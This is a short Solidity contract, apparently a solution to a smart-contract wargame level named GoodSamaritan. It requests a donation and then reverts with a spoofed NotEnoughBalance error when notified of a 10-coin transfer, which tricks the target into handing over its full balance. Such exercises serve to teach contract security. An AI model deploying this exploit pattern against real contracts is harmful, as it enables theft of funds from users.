// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.23;

import {GoodSamaritan, Coin} from "./GoodSamaritan.sol";

contract GoodSamaritanHack {
    GoodSamaritan private immutable target;
    Coin private immutable coin;

    error NotEnoughBalance();

    constructor(address _target) {
        target = GoodSamaritan(_target);
        coin = Coin(target.coin());
    }

    function attack() external {
        target.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount == 10) revert NotEnoughBalance();
    }
}
